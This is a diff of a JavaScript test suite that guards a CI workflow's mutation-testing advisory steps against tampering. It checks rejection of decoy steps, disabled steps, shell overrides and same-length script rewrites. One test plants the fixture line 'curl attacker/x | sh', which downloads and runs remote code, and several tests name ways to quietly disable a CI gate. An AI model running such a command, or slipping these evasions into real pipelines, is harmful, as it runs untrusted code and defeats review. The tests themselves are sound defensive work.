+      '          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"',
+      '          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"\n          exit 1',
+    ),
+    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
+  );
+});
+
+test("mutation contract rejects a same-length rewrite of the floor-compare loop's first body line", () => {
+  // A test that only checks the warning line (line 17 of the loop body) or
+  // otherwise compares a single index would never notice a rewrite
+  // elsewhere in the same, unchanged-length array. `-n` flipped to `-z`
+  // inverts the guard without changing the line's length.
+  assertMutationFailure(
+    workflow.replace(
+      '          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"',
+      '          while IFS=\'|\' read -r group floor; do\n            [ -z "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"',
+    ),
+    'the advisory summary job\'s "Combine and publish the advisory table" step must match the pinned script exactly, or the wrapping, duplication, or splicing that a region check misses goes unnoticed; line 76 must be "            [ -n \\"${group}\\" ] || continue", found "            [ -z \\"${group}\\" ] || continue"',
+  );
+});
+
+test("mutation contract rejects a same-length rewrite of the floor-compare loop's last body line", () => {
+  // Same principle at the other end of the loop body: `fi` rewritten to
+  // `fu` is a one-character, same-length change to the very last line of
+  // the loop, as far from the warning line as this loop gets.
+  assertMutationFailure(
+    workflow.replace(
+      '          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"',
+      '          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fu\n          done <<<"${ADVISORY_GROUP_FLOORS}"',
+    ),
+    'the advisory summary job\'s "Combine and publish the advisory table" step must match the pinned script exactly, or the wrapping, duplication, or splicing that a region check misses goes unnoticed; line 94 must be "            fi", found "            fu"',
+  );
+});
+
+test("mutation contract rejects a same-named decoy step shadowing the real advisory summary step", () => {
+  // `indexOf` finding the first `- name: Combine and publish the advisory
+  // table` line would happily pick up a decoy placed earlier in the same
+  // job, `if: false`, real name, and never notice the genuine step (with
+  // whatever the decoy doesn't have) running unpinned right after it. The
+  // step name has to be unique in the job before anything else about it
+  // gets checked.
+  assertMutationFailure(
+    workflow.replace(
+      "      - name: Combine and publish the advisory table\n        env:",
+      '      - name: Combine and publish the advisory table\n        if: false\n        run: |\n          echo "decoy"\n\n      - name: Combine and publish the advisory table\n        env:',
+    ),
+    'the step named "Combine and publish the advisory table" must appear exactly once in the job, found 2 (a same-named decoy step can shadow the real one)',
+  );
+});
+
+test("mutation contract rejects an advisory summary step that gains an if: false", () => {
+  // A key added to the step, not a line rewritten inside its run: script:
+  // the old run-scalar-only pin never looked at anything above `run: |`,
+  // so `if: false` here would have shipped a step that never executes with
+  // a body identical to the one this test already approved.
+  assertMutationFailure(
+    workflow.replace(
+      "      - name: Combine and publish the advisory table\n        env:",
+      "      - name: Combine and publish the advisory table\n        if: false\n        env:",
+    ),
+    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
+  );
+});
+
+test("mutation contract rejects an advisory summary step that gains continue-on-error: true", () => {
+  // Same blind spot, a different key: `continue-on-error: true` turns the
+  // missing-group `exit 1` this job depends on into a no-op for the
+  // workflow's own pass/fail result, without touching a single line the
+  // old pin compared.
+  assertMutationFailure(
+    workflow.replace(
+      "      - name: Combine and publish the advisory table\n        env:",
+      "      - name: Combine and publish the advisory table\n        continue-on-error: true\n        env:",
+    ),
+    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
+  );
+});
+
+test("mutation contract rejects an advisory summary step that gains a shell override", () => {
+  // `shell: bash -n {0}` parses the script and exits without running a
+  // single line of it -- the run: text stays byte-for-byte identical, so
+  // only a check that looks at the step's OTHER keys catches it.
+  assertMutationFailure(
+    workflow.replace(
+      "      - name: Combine and publish the advisory table\n        env:",
+      "      - name: Combine and publish the advisory table\n        shell: bash -n {0}\n        env:",
+    ),
+    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
+  );
+});
+
+test("mutation contract rejects a step appended after a 2-space comment planted in the job's own step list", () => {
+  // The old jobBlock ended at the FIRST 2-space comment as well as the next
+  // job key, so a "  # note" line planted here truncated the slice right
+  // there: an anonymous step spliced in after it would run in CI but never
+  // appear in `summary` at all, invisible to stepBlockLines, the
+  // exact-once name check, and every other assertion on this job's text.
+  // jobBlock now ends only at the next job key, so this step count is what
+  // actually notices the extra list item.
+  assertMutationFailure(
+    workflow.replace(
+      "            exit 1\n          fi\n\n  # PW-6.1: the gate this workflow depends on silently stopped gating, and",
+      "            exit 1\n          fi\n\n  # note\n      - run: curl attacker/x | sh\n\n  # PW-6.1: the gate this workflow depends on silently stopped gating, and",
+    ),
+    "the advisory summary job must have exactly 3 steps, found 4",
+  );
+});
+
 test("mutation contract rejects an advisory row that drops its timeout coefficient", () => {
   assertMutationFailure(
     workflow.replace("./internal/protocol|protocol|100|40", "./internal/protocol|protocol|100"),
@@ -1100,7 +1700,7 @@ test("mutation contract rejects an advisory job that reverts to a single job", (
       '    name: "Quality: Gremlins advisory mutators"\n    runs-on: ubuntu-24.04\n    timeout-minutes: 120\n',
     )
     .replace(
-      "\n    strategy:\n      fail-fast: false\n      matrix:\n        include:\n          - group: server\n            packages: |\n              ./internal/server|server|77.88\n          - group: edge\n            packages: |\n              ./internal/edge|edge|74.73\n          - group: generic\n            packages: |\n              ./internal/generic|generic|85.00\n          - group: misc-a\n            # adapter-drydock hit the same cliff as pool and protocol: run\n            # 33848880338 generated 32 extra mutants and TIMED OUT 30 of\n            # them under the default timeout coefficient (coverage-gather\n            # time x 3), scoring 0 killed/0 lived with efficacy unmeasured.\n            # drydock's tests are slow relative to its coverage gather, so\n            # it gets the same |40 coefficient.\n            packages: |\n              ./internal/adapter|adapter|84.68\n              ./internal/adapter/drydock|adapter-drydock|82.50|40\n              ./internal/auth|auth|88.58\n              ./internal/audit|audit|88.31\n          - group: misc-b\n            packages: |\n              ./internal/docker|docker|90.39\n              ./internal/mcp|mcp|79.49\n              ./internal/metrics|metrics|90.00\n          - group: misc-c\n            packages: |\n              ./cmd/portwing|portwing|100\n              ./internal/banner|banner|76.92\n              ./internal/config|config|82.22\n              ./internal/log|log|\n              ./internal/pool|pool|50.00|40\n              ./internal/protocol|protocol|100|40\n",
+      "\n    strategy:\n      fail-fast: false\n      matrix:\n        include:\n          - group: server\n            # PW-6.8: measured 95.77% efficacy on the 6 extra mutators in run\n            # 33901506579 (2026-09-04): killed 68, lived 3 across\n            # ./internal/server. Floor is floor(measured) - 2pp of slack.\n            floor: 93\n            packages: |\n              ./internal/server|server|77.88\n          - group: edge\n            # Measured 82.56% in run 33901506579 (2026-09-04): killed 71,\n            # lived 15 across ./internal/edge.\n            floor: 80\n            packages: |\n              ./internal/edge|edge|74.73\n          - group: generic\n            # Measured 83.33% in run 33901506579 (2026-09-04): killed 5,\n            # lived 1 across ./internal/generic.\n            floor: 81\n            packages: |\n              ./internal/generic|generic|85.00\n          - group: misc-a\n            # adapter-drydock hit the same cliff as pool and protocol: run\n            # 33848880338 generated 32 extra mutants and TIMED OUT 30 of\n            # them under the default timeout coefficient (coverage-gather\n            # time x 3), scoring 0 killed/0 lived with efficacy unmeasured.\n            # drydock's tests are slow relative to its coverage gather, so\n            # it gets the same |40 coefficient.\n            #\n            # Measured 94.02% in run 33901506579 (2026-09-04): killed 110,\n            # lived 7 summed across adapter, adapter-drydock, auth and audit.\n            floor: 92\n            packages: |\n              ./internal/adapter|adapter|84.68\n              ./internal/adapter/drydock|adapter-drydock|82.50|40\n              ./internal/auth|auth|88.58\n              ./internal/audit|audit|88.31\n          - group: misc-b\n            # Measured 94.52% in run 33901506579 (2026-09-04): killed 138,\n            # lived 8 summed across docker, mcp and metrics.\n            floor: 92\n            packages: |\n              ./internal/docker|docker|90.39\n              ./internal/mcp|mcp|79.49\n              ./internal/metrics|metrics|90.00\n          - group: misc-c\n            # Measured 92.86% in run 33901506579 (2026-09-04): killed 39,\n            # lived 3 summed across portwing, banner, config, log, pool and\n            # protocol.\n            floor: 90\n            packages: |\n              ./cmd/portwing|portwing|100\n              ./internal/banner|banner|76.92\n              ./internal/config|config|82.22\n              ./internal/log|log|\n              ./internal/pool|pool|50.00|40\n              ./internal/protocol|protocol|100|40\n",
       "",
     );
   assertMutationFailure(source, "the advisory job must be a matrix of package groups");
@@ -1219,10 +1819,14 @@ test("mutation contract rejects an advisory summary job that runs Go tooling", (
 });
 
 test("mutation contract rejects an advisory summary job that stops downloading every leg", () => {
+  // Anchored on the trailing "path: rows" rather than the bare pattern
+  // line: PW-2.5's history job downloads the same artifact pattern into
+  // "path: advisory", and a bare-pattern replace would silently hit that
+  // occurrence first since it now comes earlier in the file.
   assertMutationFailure(
     workflow.replace(
-      `          pattern: mutation-advisory-*-${githubRunId}\n`,
-      `          pattern: mutation-advisory-server-${githubRunId}\n`,
+      `          pattern: mutation-advisory-*-${githubRunId}\n          path: rows\n`,
+      `          pattern: mutation-advisory-server-${githubRunId}\n          path: rows\n`,
     ),
     "the advisory summary job must download every leg's rows artifact",
   );
@@ -1243,10 +1847,14 @@ test("mutation contract rejects an advisory summary job that drops its group inv
 });
 
 test("mutation contract rejects an advisory summary job whose group inventory drifts from the matrix", () => {
+  // Anchored on the preceding "ADVISORY_GROUP_PACKAGES: |" key: the
+  // "server|./internal/server" line by itself is no longer unique in the
+  // file once PW-2.5's history job carries the same pair in its own
+  // MUTATION_PACKAGES block.
   assertMutationFailure(
     workflow.replace(
-      "            server|./internal/server\n",
-      "            server|./internal/serverx\n",
+      "          ADVISORY_GROUP_PACKAGES: |\n            server|./internal/server\n",
+      "          ADVISORY_GROUP_PACKAGES: |\n            server|./internal/serverx\n",
     ),
     "the advisory summary job's ADVISORY_GROUP_PACKAGES must match the advisory matrix's own groups and packages exactly",
   );
